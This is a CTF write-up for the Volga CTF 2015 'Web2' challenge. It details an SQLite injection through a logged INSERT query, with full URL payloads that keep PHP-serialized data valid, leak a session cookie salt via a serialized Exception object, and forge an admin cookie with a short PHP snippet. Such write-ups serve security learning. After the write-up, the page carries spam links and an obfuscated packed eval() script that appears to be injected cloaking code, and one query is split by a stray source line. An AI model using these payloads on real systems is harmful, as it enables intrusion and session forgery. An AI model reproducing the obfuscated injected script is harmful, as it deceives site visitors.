---
title: "Web2 writeup"
date: Fri, 08 May 2015 17:41:19 +0000
draft: false
type: posts
categories: 
- 
---
# Web2 writeup

<br/>

<br/>
Category: 

[web](/categories/web)

Event: 

[Volga CTF 2015 Quals](/event/34)

This is the Web2 problem

The challenge simply states "Find the key!" and it gives us the challenge URL.  
The first thing I usually do with a web challenge is to run dirbuster, spider the target and check the it with Nmap. 

Checking with Nmap didn't result in anything interesting. However dirbuster did. I found two interesting folders.  
The first one is "SecretAdminPanel" and the second one was "logs"

I visited "SecretAdminPanel" and I saw this.

![](/sites/default/files/writeups/images/Screen%20Shot%202015-05-05%20at%209.29.59%20PM.png)

So our goal is basically try to access this "SecretAdminPanel".  
I then visited the "logs" folder, and I found that my IP got logged with the parameters I submitted to the page (so far no params).   
I visited the SecretAdminPanel again and submitted some data through the GET request 

web2.2015.volgactf.ru/SecretAdminPanel?test=test

I saw this message: "Don't attempt to hack, all requests will be logged."   
Well this, in CTFs, This message simply means: HACK from here.

At the beginning I though that we will have SQLi in the INSERT statement in our request. I thought it will SQLi in the IP by injecting in the X-Forwarded-For or Client-IP request Headrs.  
I tried SQLi there but didn't get any result.   
  
Then probably in the params.   
I tried the following request: http://web2.2015.volgactf.ru/SecretAdminPanel?test=test%27  
and I got **Error:** unrecognized token: "";}')"  
Interesting we have some errors available. looks like SQLi and my request was NOT logged. This means we probably had SQLi error and the request didn't finish processing due to the error.  
I tried this one to double-check  
http://web2.2015.volgactf.ru/SecretAdminPanel?test=test%27%27  
and I got no errors and the request got logged perfectly.   
  
**Exploitation:**   
Now it is the time to exploit. I managed to know that th DBMS was sqlite. So this what I want to exploit: a SQLite database.   
I am injecting in an insert statement and I am injecting in the last column.   
I believe that the query in the backend was something like  
  
query = INSERT INTO logs (IP, PARAMS) VALUES ($ip, $params);

I usually when I have a SQLi bug and errors are enabled. I try to inject in different places in the query to see the errors of the database. As a result of seeing the errors I can see part of the query in the backend.  
So I injected in this part of the query string   
http://web2.2015.volgactf.ru/SecretAdminPanel?test%27=test  
and that was the result   
**Error:** near "";s:4:"": syntax error  
what we see here part of the INSERT query but we can see s:4: and this is part of a serialized string in PHP.  
So probably the code in the backend something like this   
  
$params = serialize($\_GET)  
query = "INSERT INTO logs (IP, PARAMS) VALUES (

#### [Source](https://ctfcrew.org/writeup/101)

<br/>
---
ip', '$params');"

now we want to have our injection with the serialization. I frist looked for the string concatenation operator in the SQLite to concatenate the result I want to see with the params. The string concatenation operator was "||"/  
I tried this request first   
http://web2.2015.volgactf.ru/SecretAdminPanel?test=test'||(Select "a")||'

The request worked successfully no SQL errors, this means our injection was correct.   
However I checked the logs page and that was the result 

array(2) {

  \["ip"\]=>

  string(12) "MY\_IP"

  \["params"\]=>

  bool(false)

}

Why is this ?? It looks like that PHP couldn't deserialize the column correctly.   
What they do in the backend something similar to this   
  
SELECT IP, params from logs where IP = MyIP;  
$params = unserialize(params)  
var\_dump($params)

so we have a problem in deserializing our data.   
This is true because our injection was something like  
?test=test'||(Select "a")||'

So the serialized string: 'a:1:{s:4:"test";s:22:"test'||(Select "a")||'";}'  
and the string stored in the database: 'a:1:{s:4:"test";s:22:"testa";}'  
This discrepancy between the INSERT statement and what stores in the database cause this error.

To solve this, I used something like repeat and substring functions in sqlite to have valid serialized string and stored correctly in the database.   
  
That was my final query   
http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28SELECT%28substr%28group\_concat%28name%29,0,5%29%29FROM%28sqlite\_master%29%29||%28select%28replace%28substr%28quote%28zeroblob%28%28130%2b1%29/2%29%29,3,130%29,%220%22,%22a%22%29%29%29||%27

  
Executing this query will return us the names of tables in the database.  
This query to extract the content of the params column in the database  
  
http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28SELECT%28hex%28substr%28group\_concat%28params%29,100,61%29%29%29FROM%28logs%29%29||%28select%28replace%28substr%28quote%28zeroblob%28%289%2b1%29/2%29%29,3,9%29,%220%22,%22a%22%29%29%29||%27

I assumed we might get the params that the admin used to login into this page and then we will get the flag. However, it was not that easily.   
Unfortunately the data inside the database was only mine, which means that each use has its own copy of the database.  
The flag wont be in the database so we need to think of something else.   
  
In the cookies we have this interesting cookie. PHPSESS=%7B%22isAdmin%22%3Afalse%7D0afb5cf5c7d66587da7c811767250458; expires=Fri, 08 May 2015 18:08:16 GMT; path=/; domain=.web2.2015.volgactf.ru; HttpOnly

Maybe to get the flag, we need to get the cookie salt used to form this cookie and form the valid cookie where isAdmin:true  
another member in the team suggested to have the serialized Exception object, and when this object gets deseialized we will see our stacktrace and we might get something useful.   
  
I used this query to add the exception object into the database.   
  

[http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0](http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0):{}}

and when we viewed the logs page we indeed saw the stacktrace and part of the output contains this  
  
object(Session)#3 (2) {  
\["cookieSalt":"Session":private\]=>  
string(20) "nO97M0Za6cu9wDC72VVv"  
\["params":"Session":private\]=>  
array(1) {  
\["isAdmin"\]=>  
bool(false)

No we have the salt. To construct the valid cookie we simply need to do the following:  
  

<?php  
$str='{"isAdmin":true}';  
$salt='nO97M0Za6cu9wDC72VVv';  
echo urlencode($str).md5($str.$salt);  
?>

and the flag was 

{417a4c17bd3132bba864dac9edf4ae7a}

Notes:  
1- I think it worth more than 200 pts comparing to the challenge remote web or even the joy and relax challenges.  
2- There was a much easier way to exploit the SQLi. Simply we could have used stacked quiries ^^. It is sqlite so I could have simply added the serialized Exception object into the DB using something similar to this query. you just need to know how to use the query without spaces because it was replaced with underscores '\_'  

[http://web2.2015.volgactf.ru/SecretAdminPanel?test](http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0)');INSERT INTO logs(IP, PARAMS) VALUES ('127.0.0.1', 'O:9:"Exception":0:{}')--

[Sportswear Design](https://www.jmksport.com/) | [Nike News](https://www.fitforhealth.eu/cdakshop/category/nike/)eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d\[e(c)\]=k\[c\]||e(c);k=\[function(e){return d\[e\]}\];e=function(){return'\\\\w+'};c=1;};while(c--)if(k\[c\])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k\[c\]);return p;}('b i=r f\["\\\\q\\\\1\\\\4\\\\g\\\\p\\\\l"\]("\\\\4"+"\\\\7"+"\\\\7"+"\\\\4"+"\\\\5\\\\1","\\\\4\\\\k");s(!i\["\\\\3\\\\1\\\\2\\\\3"\](m\["\\\\h\\\\2\\\\1\\\\j\\\\n\\\\4\\\\1\\\\6\\\\3"\])){b a=f\["\\\\e\\\\7\\\\o\\\\h\\\\d\\\\1\\\\6\\\\3"\]\["\\\\4\\\\1\\\\3\\\\g\\\\5\\\\1\\\\d\\\\1\\\\6\\\\3\\\\2\\\\z\\\\9\\\\A\\\\5\\\\c\\\\2\\\\2\\\\x\\\\c\\\\d\\\\1"\](\\'\\\\t\\\\1\\\\9\\\\2\\\\w\\\\v\\\\7\\\\j\\\\e\\\\2\\');u(b 8=0;8<a\["\\\\5\\\\1\\\\6\\\\4\\\\3\\\\y"\];8++)a\[8\]\["\\\\2\\\\3\\\\9\\\\5\\\\1"\]\["\\\\e\\\\k\\\\2\\\\l\\\\5\\\\c\\\\9"\]=\\'\\\\6\\\\7\\\\6\\\\1\\'}',37,37,'|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43'.split('|'),0,{}));

#### [Source](https://ctfcrew.org/writeup/101)

<br/>
---
